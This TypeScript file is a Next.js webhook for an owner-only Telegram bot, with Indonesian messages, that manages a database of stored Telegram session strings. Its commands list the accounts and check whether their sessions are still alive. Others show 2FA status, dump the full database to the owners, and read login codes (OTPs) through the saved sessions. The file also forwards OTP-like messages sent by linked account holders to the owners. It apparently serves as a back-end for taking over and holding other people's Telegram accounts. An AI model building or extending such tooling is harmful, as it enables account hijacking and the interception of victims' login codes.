import { initSchema, query, queryOne, execute, encryptMessage, decryptMessage } from "@/lib/db";
import { dumpAllTables, formatBackupFileName } from "@/lib/backup";
import { sendMessage, sendChatAction, sendDocumentWithRetry, editMessageText } from "@/lib/telegramBot";
import { isOtpMessage, forwardOtpToOwners } from "@/lib/otp";
import { verifySessionHealth, fetchOtpFromTelegramSession } from "@/lib/telegramClient";

export const runtime = "nodejs";
export const maxDuration = 30;

function parseOwnerIds(): bigint[] {
  const raw = process.env.TELEGRAM_OWNER_IDS || "";
  const parts = raw.split(",").map((s) => s.trim()).filter(Boolean);
  const ids: bigint[] = [];
  for (const part of parts) {
    try {
      ids.push(BigInt(part));
    } catch {
      console.warn("[webhook] Invalid owner ID skipped:", part);
    }
  }
  return ids;
}

function isOwner(userId: bigint): boolean {
  return parseOwnerIds().includes(userId);
}

function getCommand(text?: string): { command: string; args: string[] } | null {
  if (!text) return null;
  const match = text.trim().match(/^\/(\w+)(?:@\w+)?(?:\s+(.*))?$/);
  if (!match) return null;
  return { command: match[1].toLowerCase(), args: match[2] ? match[2].trim().split(/\s+/) : [] };
}

async function handleStart(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) {
    await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner.");
    return;
  }
  const ownerIds = parseOwnerIds();
  await sendMessage(
    chatId,
    `👋 Halo! Selamat datang di <b>Bot WEBSTOCKHAMZ</b>\n\n` +
    `📋 <b>Perintah yang tersedia:</b>\n` +
    `• /start — Tampilkan pesan ini\n` +
    `• /backup — Backup database penuh (JSON)\n` +
    `• /getotp [nomor] — Ambil OTP dari sesi aktif\n` +
    `• /checknomor [nomor] — Cek apakah nomor ada di DB\n` +
    `• /login [nomor] — Uji sesi Telegram yang tersimpan\n` +
    `• /accounts — Lihat semua akun di database\n` +
    `• /checkall — Cek keaktifan semua sesi\n` +
    `• /info [nomor] — Detail info satu akun\n` +
    `• /logout [nomor] — Hapus sesi dari database\n\n` +
    `✅ Owner terdaftar: ${ownerIds.length} akun`,
    "HTML"
  );
}

async function handleBackup(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) {
    await sendMessage(chatId, "⛔ Akses ditolak. Hanya owner yang bisa backup.");
    return;
  }

  const ownerIds = parseOwnerIds();
  await sendMessage(chatId, "🔄 Memulai backup database...");
  await sendChatAction(chatId, "upload_document");

  try {
    const backupData = await dumpAllTables();
    const jsonContent = JSON.stringify(backupData, null, 2);
    const fileName = formatBackupFileName();

    console.log(`[backup] Dumped ${backupData.total_rows} rows from ${Object.keys(backupData.tables).length} tables`);

    const results = await Promise.allSettled(
      ownerIds.map(async (id: bigint) => {
        return await sendDocumentWithRetry(String(id), fileName, jsonContent, `📦 Backup ${backupData.exported_at}`);
      })
    );

    const failed = results.filter((r) => r.status === "rejected").length;
    if (failed === 0) {
      await sendMessage(chatId, `✅ Backup selesai! File <code>${fileName}</code> terkirim ke ${ownerIds.length} owner.`, "HTML");
    } else {
      await sendMessage(chatId, `⚠️ Backup selesai tapi ${failed} owner gagal terkirim. Cek log server.`);
    }
  } catch (err) {
    console.error("[backup] Error:", err);
    await sendMessage(chatId, `❌ Backup gagal: ${err instanceof Error ? err.message : String(err)}`);
  }
}

async function findAccountSession(targetPhone?: string): Promise<{ session_string: string; phone: string } | null> {
  if (targetPhone && targetPhone.trim()) {
    const raw = targetPhone.trim();
    let withPlus = raw;
    let noPlus = raw.replace(/^\+/, "");
    let local = raw;

    if (raw.startsWith("0")) {
      noPlus = "62" + raw.slice(1);
      withPlus = "+" + noPlus;
    } else if (!raw.startsWith("+")) {
      withPlus = "+" + raw;
    } else {
      local = "0" + raw.slice(3);
    }

    const cleanDigits = raw.replace(/\D/g, "");

    let account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM telegram_accounts 
       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
         AND session_string IS NOT NULL AND session_string <> '' 
       LIMIT 1`,
      [withPlus, noPlus, local, cleanDigits]
    );

    if (account) return account;

    account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM otp_sessions 
       WHERE (phone = $1 OR phone = $2 OR phone = $3 OR REPLACE(phone, '+', '') = $4) 
         AND session_string IS NOT NULL AND session_string <> '' 
       ORDER BY updated_at DESC LIMIT 1`,
      [withPlus, noPlus, local, cleanDigits]
    );

    return account;
  }

  let account = await queryOne<{ session_string: string; phone: string }>(
    `SELECT session_string, phone FROM telegram_accounts 
     WHERE session_string IS NOT NULL AND session_string <> '' 
     ORDER BY signed_at DESC LIMIT 1`
  );

  if (!account) {
    account = await queryOne<{ session_string: string; phone: string }>(
      `SELECT session_string, phone FROM otp_sessions 
       WHERE session_string IS NOT NULL AND session_string <> '' 
       ORDER BY updated_at DESC LIMIT 1`
    );
  }

  return account;
}

async function handleGetOtp(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) {
    await sendMessage(chatId, "⛔ Akses ditolak. Bot ini hanya untuk owner.");
    return;
  }

  const targetPhone = args && args.length > 0 ? args[0] : "";
  const account = await findAccountSession(targetPhone);

  if (!account || !account.session_string) {
    await sendMessage(chatId, `❌ Sesi akun tidak ditemukan di database.\n\nGunakan /accounts untuk melihat daftar akun.`);
    return;
  }

  const msg = await sendMessage(chatId, `⏳ Menghubungi sesi (${account.phone})...`).catch(() => null);
  if (!msg) return;

  try {
    const res = await fetchOtpFromTelegramSession(account.session_string);
    if (!res.success) {
      await editMessageText(chatId, msg.message_id, `❌ <b>ERROR</b>: ${res.error}`, "HTML").catch(() => {});
    } else if (res.message) {
      await editMessageText(
        chatId,
        msg.message_id,
        `✉️ <b>Pesan dari ${account.phone}:</b>\n\n<code>${res.message}</code>`,
        "HTML"
      ).catch(() => {});
    } else {
      await editMessageText(chatId, msg.message_id, `📭 Tidak ada pesan dari ${account.phone}.`).catch(() => {});
    }
  } catch (err: any) {
    await editMessageText(chatId, msg.message_id, `❌ ERROR: ${err.message || String(err)}`).catch(() => {});
  }
}

// COMMAND BARU: /checknomor
async function handleCheckNomor(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /checknomor [nomor]\nContoh: /checknomor +628123456789");
    return;
  }

  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const noPlus = targetPhone.replace("+", "");

  const acc = await queryOne<{ phone: string; first_name: string; username: string; signed_at: Date; session_string: string }>(
    `SELECT phone, first_name, username, signed_at, session_string 
     FROM telegram_accounts 
     WHERE phone = $1 OR REPLACE(phone, '+', '') = $2`,
    [targetPhone, noPlus]
  );

  const otpSess = await queryOne<{ phone: string; status: string; created_at: Date }>(
    `SELECT phone, status, created_at 
     FROM otp_sessions 
     WHERE phone = $1 OR REPLACE(phone, '+', '') = $2 
     ORDER BY created_at DESC LIMIT 1`,
    [targetPhone, noPlus]
  );

  if (!acc && !otpSess) {
    await sendMessage(chatId, `❌ Nomor <code>${targetPhone}</code> <b>tidak ditemukan</b> di database.`, "HTML");
    return;
  }

  let msg = `🔍 <b>Hasil Cek Nomor: <code>${targetPhone}</code></b>\n\n`;
  
  if (acc) {
    msg += `✅ <b>Ada di telegram_accounts</b>\n`;
    msg += `• Nama: ${acc.first_name || "-"}\n`;
    msg += `• Username: ${acc.username ? "@" + acc.username : "-"}\n`;
    msg += `• Login: ${new Date(acc.signed_at).toLocaleString('id-ID')}\n`;
    msg += `• Sesi: ${acc.session_string ? "✅ Ada" : "❌ Kosong"}\n\n`;
  }

  if (otpSess) {
    msg += `📋 <b>Ada di otp_sessions</b>\n`;
    msg += `• Status: ${otpSess.status}\n`;
    msg += `• Waktu: ${new Date(otpSess.created_at).toLocaleString('id-ID')}\n`;
  }

  await sendMessage(chatId, msg, "HTML");
}

async function handleLogin(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /login [nomor]\nContoh: /login +628123456789");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const statusMsg = await sendMessage(chatId, `🔄 Memeriksa sesi untuk ${targetPhone}...`);
  
  const account = await queryOne<{ session_string: string; first_name: string; last_name: string; username: string }>(
    `SELECT session_string, first_name, last_name, username FROM telegram_accounts WHERE phone = $1`,
    [targetPhone]
  );

  if (!account || !account.session_string) {
    await editMessageText(chatId, statusMsg.message_id, `⛔ Nomor ${targetPhone} tidak ditemukan atau tidak memiliki sesi.`);
    return;
  }

  const health = await verifySessionHealth(account.session_string);
  
  if (!health.active) {
    await editMessageText(
      chatId,
      statusMsg.message_id,
      `❌ <b>Sesi tidak valid/expired</b>\nNomor: ${targetPhone}\nError: ${health.error}`,
      "HTML"
    );
    return;
  }

  const u = health.user as any;
  const name = [u.firstName, u.lastName].filter(Boolean).join(" ") || "-";
  
  await editMessageText(
    chatId,
    statusMsg.message_id,
    `✅ <b>Sesi Aktif!</b>\n\n` +
    `👤 Nama: ${name}\n` +
    `🔗 Username: ${u.username ? "@" + u.username : "-"}\n` +
    `🆔 User ID: <code>${u.id}</code>\n` +
    `📱 Nomor: ${targetPhone}`,
    "HTML"
  );
}

async function handleAccounts(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) return;
  const accounts = await query<{ phone: string; first_name: string; username: string; signed_at: Date }>(
    `SELECT phone, first_name, username, signed_at FROM telegram_accounts ORDER BY signed_at DESC LIMIT 50`
  );
  if (accounts.length === 0) {
    await sendMessage(chatId, "📭 Belum ada akun yang tersimpan di database.");
    return;
  }
  let msg = `📋 <b>Daftar Akun (${accounts.length})</b>\n\n`;
  accounts.forEach((acc, i) => {
    const tanggal = new Date(acc.signed_at).toLocaleDateString('id-ID');
    msg += `${i + 1}. <code>${acc.phone}</code>\n   ${acc.first_name || "-"} ${acc.username ? "(@" + acc.username + ")" : ""} [${tanggal}]\n`;
  });
  await sendMessage(chatId, msg, "HTML");
}

async function handleCheckAll(chatId: number | string, userId: bigint): Promise<void> {
  if (!isOwner(userId)) return;
  const accounts = await query<{ phone: string; session_string: string }>(
    `SELECT phone, session_string FROM telegram_accounts WHERE session_string IS NOT NULL AND session_string <> ''`
  );
  if (accounts.length === 0) {
    await sendMessage(chatId, "📭 Belum ada akun di database.");
    return;
  }
  
  const statusMsg = await sendMessage(chatId, `🔄 Memeriksa ${accounts.length} akun... Mohon tunggu.`);
  
  let active = 0, expired = 0;
  const expiredList: string[] = [];
  
  for (const acc of accounts) {
    const health = await verifySessionHealth(acc.session_string);
    if (health.active) {
      active++;
    } else {
      expired++;
      expiredList.push(acc.phone);
    }
  }
  
  let result = `📊 <b>Hasil Pemeriksaan Sesi</b>\n\n` +
    `✅ Aktif: ${active}\n` +
    `❌ Expired: ${expired}\n` +
    `📱 Total: ${accounts.length}`;
  
  if (expiredList.length > 0 && expiredList.length <= 10) {
    result += `\n\n<b>Sesi expired:</b>\n`;
    expiredList.forEach(p => { result += `• <code>${p}</code>\n`; });
  }
  
  await editMessageText(chatId, statusMsg.message_id, result, "HTML");
}

async function handleLogout(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /logout [nomor]\nContoh: /logout +628123456789");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const result = await execute(`UPDATE telegram_accounts SET session_string = '' WHERE phone = $1`, [targetPhone]);
  if (result > 0) {
    await sendMessage(chatId, `✅ Sesi untuk <code>${targetPhone}</code> telah dihapus dari database.`, "HTML");
  } else {
    await sendMessage(chatId, `⛔ Nomor <code>${targetPhone}</code> tidak ditemukan di database.`, "HTML");
  }
}

async function handleInfo(chatId: number | string, userId: bigint, args: string[]): Promise<void> {
  if (!isOwner(userId)) return;
  if (!args || args.length === 0) {
    await sendMessage(chatId, "ℹ️ Penggunaan: /info [nomor]\nContoh: /info +628123456789");
    return;
  }
  let targetPhone = args[0];
  if (targetPhone.startsWith("0")) targetPhone = "+62" + targetPhone.slice(1);
  if (!targetPhone.startsWith("+")) targetPhone = "+" + targetPhone;

  const acc = await queryOne<{
    phone: string; user_id: string; first_name: string; last_name: string;
    username: string; signed_at: Date; session_string: string; two_fa_password_hash: string;
  }>(`SELECT * FROM telegram_accounts WHERE phone = $1`, [targetPhone]);
  
  if (!acc) {
    await sendMessage(chatId, `⛔ Nomor <code>${targetPhone}</code> tidak ditemukan.`, "HTML");
    return;
  }
  
  let msg = `ℹ️ <b>Informasi Akun</b>\n\n` +
    `📱 Nomor: <code>${acc.phone}</code>\n` +
    `🆔 User ID: <code>${acc.user_id || "-"}</code>\n` +
    `👤 Nama: ${acc.first_name || ""} ${acc.last_name || ""}\n` +
    `🔗 Username: ${acc.username ? "@" + acc.username : "-"}\n` +
    `🔐 2FA: ${acc.two_fa_password_hash ? "✅ Ya" : "❌ Tidak"}\n` +
    `🕒 Login: ${new Date(acc.signed_at).toLocaleString('id-ID')}\n` +
    `🔑 Sesi: ${acc.session_string ? "✅ Ada" : "❌ Kosong/Logout"}`;
            
  await sendMessage(chatId, msg, "HTML");
}

async function processUpdate(update: any): Promise<void> {
  const msg = update.message;
  if (!msg || !msg.from) return;

  const userId = BigInt(msg.from.id);
  const chatId = msg.chat.id;
  const text = msg.text;

  // Simpan OTP jika nomor terdaftar
  if (text && !text.startsWith("/")) {
    const linkedUser = await queryOne<{ phone: string }>(
      `SELECT phone FROM telegram_accounts WHERE user_id = $1`,
      [userId]
    );
    if (linkedUser && isOtpMessage(text)) {
      await forwardOtpToOwners(linkedUser.phone, text);
      try {
        const encryptedText = encryptMessage(text);
        await execute(
          `INSERT INTO otp_messages (phone, telegram_user_id, telegram_chat_id, message_text) VALUES ($1, $2, $3, $4)`,
          [linkedUser.phone, userId, chatId, encryptedText]
        );
      } catch (err) {
        console.error(`[webhook] Failed to store OTP message:`, err);
      }
    }
  }

  const cmd = getCommand(text);
  if (!cmd) return;

  console.log(`[webhook] /${cmd.command} from user ${userId} in chat ${chatId}`);

  switch (cmd.command) {
    case "start":
      await handleStart(chatId, userId);
      break;
    case "backup":
      await handleBackup(chatId, userId);
      break;
    case "getotp":
      await handleGetOtp(chatId, userId, cmd.args);
      break;
    case "checknomor":
      await handleCheckNomor(chatId, userId, cmd.args);
      break;
    case "login":
      await handleLogin(chatId, userId, cmd.args);
      break;
    case "accounts":
      await handleAccounts(chatId, userId);
      break;
    case "checkall":
      await handleCheckAll(chatId, userId);
      break;
    case "logout":
      await handleLogout(chatId, userId, cmd.args);
      break;
    case "info":
      await handleInfo(chatId, userId, cmd.args);
      break;
    default:
      if (isOwner(userId)) {
        await sendMessage(chatId, `❓ Perintah tidak dikenal: /${cmd.command}\nGunakan /start untuk bantuan.`);
      }
  }
}

export async function POST(req: Request): Promise<Response> {
  try {
    await initSchema();
    const update = await req.json();
    console.log("[webhook] Received update:", update.update_id);
    await processUpdate(update);
    return Response.json({ ok: true });
  } catch (err) {
    console.error("[bot/webhook] Error:", err);
    return Response.json({ error: String(err) }, { status: 500 });
  }
}
